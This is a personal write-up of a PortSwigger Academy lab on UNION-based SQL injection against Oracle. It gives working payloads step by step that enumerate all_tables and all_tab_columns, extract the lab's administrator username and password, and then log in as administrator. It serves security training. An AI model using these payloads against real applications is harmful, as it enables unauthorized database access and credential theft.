---
slug: "ps-sqli-06"
title: "SQL injection attack, listing the database contents on Oracle"
platform: "PortSwigger"
difficulty: "Easy"
category: ["Web","SQLi"]
date: "2025-12-11"
minutes: 4
visible: true
tldr: "---…"
format: "html"
---

<p class="mono lab-crumb">PORTSWIGGER ACADEMY // SQLi SERIES &middot; LAB 06 &middot; <a href="https://github.com/0xWalid/Learnings/tree/main/Portswiggers/01-Sql%20Injection%20Labs/06-%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle.md" target="_blank" rel="noopener">original notes &#8599;</a></p>
<p>The vulnerable parameter was:</p>
<pre class="code" data-lang="sql"><code>category=Gifts
</code></pre>
<p>When I added a <strong>single quote <code>'</code></strong>, the page exploded into an error. This means:</p>
<p>&gt; The input is being used directly inside an SQL query without sanitization. &gt;</p>
<p>From there, I tried a UNION test like:</p>
<pre class="code" data-lang="sql"><code>Gifts' UNION SELECT NULL,NULL FROM dual--</code></pre>
<p>This told me two important things:</p>
<ul><li><strong>It’s Oracle</strong>, because <code>dual</code> is an Oracle dummy table.</li><li>The query likely selects <strong>2 columns</strong>.</li></ul>
<p>Then I tested with:</p>
<pre class="code" data-lang="sql"><code>Gifts' UNION SELECT NULL,NULL FROM all_tables--</code></pre>
<p>And that helped confirm Oracle metadata access.</p>
<p><strong>Important:</strong> Browsers encode the payload and break shit—so use <strong>Burp</strong>.</p>
<p>Based on behavior:</p>
<pre class="code" data-lang="sql"><code>SELECT * FROM products WHERE category = '&lt;user_input&gt;';</code></pre>
<p>A single quote breaks the query → perfect spot for SQLi.</p>
<p>Also, Oracle doesn’t have <code>information_schema</code>. Instead it has:</p>
<ul><li><code>all_tables</code> → list tables</li><li><code>all_tab_columns</code> → list columns</li><li><code>dual</code> → a fake 1‑row table for queries that require FROM</li></ul>
<h2>Test 1 — Confirm Injection**</h2>
<p>Payload:</p>
<pre class="code" data-lang="sql"><code>'</code></pre>
<p>Page broke → injection confirmed.</p>
<h2>Test 2 — Check Column Count**</h2>
<pre class="code" data-lang="sql"><code>Gifts' UNION SELECT NULL,NULL FROM dual--
</code></pre>
<p>Two columns matched. Boom.</p>
<h2>Test 3 — List Tables**</h2>
<p>Payload:</p>
<pre class="code" data-lang="sql"><code>Gifts' UNION SELECT table_name, NULL FROM all_tables--
</code></pre>
<p>Found the target table:</p>
<pre class="code" data-lang="sql"><code>USERS_EUKUYL</code></pre>
<p>This is the user credential table.</p>
<h2>Test 4 — List Columns**</h2>
<p>Payload:</p>
<pre class="code" data-lang="sql"><code>Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_EUKUYL'--
</code></pre>
<p>Got:</p>
<pre class="code" data-lang="sql"><code>USERNAME_INSHWY
PASSWORD_KEKXKG</code></pre>
<p>Those are your username/password column names.</p>
<h2>Test 5 — Extract Credentials**</h2>
<p>Payload:</p>
<pre class="code" data-lang="sql"><code>Gifts' UNION SELECT USERNAME_INSHWY, PASSWORD_KEKXKG FROM USERS_EUKUYL--</code></pre>
<p>Output:</p>
<pre class="code" data-lang="sql"><code>administrator
ivmo56ozoenkwimgqraf</code></pre>
<p>Full win.</p>
<p>Screenshot:</p>
<p>&lt;img width="1194" height="288" alt="image" src="https://github.com/user-attachments/assets/dad936e3-4f9c-4da1-abd3-6781638084ca" /&gt;</p>
<h2>Test 6 — Verification**</h2>
<p>Logged in normally.</p>
<p>Got:</p>
<p>&gt; "You are logged in as administrator" &gt;</p>
<p>You could update email → proof of full access.</p>
<h2>List tables:**</h2>
<pre class="code" data-lang="sql"><code>Gifts' UNION SELECT table_name, NULL FROM all_tables--</code></pre>
<h2>List columns:**</h2>
<pre class="code" data-lang="sql"><code>Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_EUKUYL'--</code></pre>
<h2>Extract data:**</h2>
<pre class="code" data-lang="sql"><code>Gifts' UNION SELECT USERNAME_INSHWY, PASSWORD_KEKXKG FROM USERS_EUKUYL--
</code></pre>
<h2>What is <code>dual</code>?**</h2>
<p>A bullshit fake table Oracle uses because Oracle requires <code>FROM</code> even when selecting static values.</p>
<p>Example:</p>
<pre class="code" data-lang="text"><code>SELECT 'hello' FROM dual;</code></pre>
<p>Other DBs don't need this.</p>
<h2>Why not INFORMATION_SCHEMA?**</h2>
<p>Because Oracle lives in its own universe.</p>
<p>Instead you use:</p>
<ul><li><code>all_tables</code></li><li><code>all_tab_columns</code></li></ul>
<h2>Why did UNION work?**</h2>
<p>UNION merges two SELECT statements, but Oracle is strict:</p>
<ul><li>Same number of columns</li><li>Same datatype in each position</li></ul>
<h2>Why uppercase table names?**</h2>
<p>Oracle stores unquoted identifiers in UPPERCASE. Always use uppercase when enumerating.</p>
<h2>Why Burp?**</h2>
<p>Browser re-encodes characters and ruins payloads.</p>
<p>Burp sends the raw request.</p>
<ul><li>Single quote → instant truth detector for SQLi.</li><li>Oracle metadata comes from dictionary tables, not <code>information_schema</code>.</li><li>UNION in Oracle demands datatype compatibility.</li><li>Always enumerate in this order:</li><li>Confirm injection</li><li>Column count</li><li>List tables</li><li>List columns</li><li>Extract data</li><li>Verify</li><li>Oracle SQL syntax is weird but predictable once learned.</li></ul>
<ul><li>Oracle doesn’t use <code>information_schema</code>.</li></ul>
<p>Use <code>all_tables</code>, <code>all_tab_columns</code>, <code>user_tables</code>, <code>user_tab_columns</code>.</p>
<ul><li>Oracle requires:</li></ul>
<pre class="code" data-lang="text"><code>SELECT 'value' FROM dual;
</code></pre>
<ul><li>String concatenation in Oracle uses:</li></ul>
<pre class="code" data-lang="text"><code>'A' || 'B'
</code></pre>
<ul><li>Comments:</li><li><code>-</code>  (must include space sometimes)</li><li><code>/* */</code></li><li>UNION needs matching datatypes.</li><li><code>dual</code> = 1‑row dummy table Oracle uses for bullshit.</li><li>Uppercase table/column names unless you see them quoted.</li></ul>
<ul><li>PortSwigger SQLi Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet</li><li>PentestMonkey Oracle SQLi Cheat Sheet: https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</li><li>General SQLi Sheets: https://www.scribd.com/document/560049559/SQL-injection-cheat-sheet</li></ul>

<details class="flag-box"><summary><span class="flag-label">LAB STATUS</span><span class="flag-hint"></span></summary><code>SQLi SERIES :: LAB 06 COMPLETE</code></details>
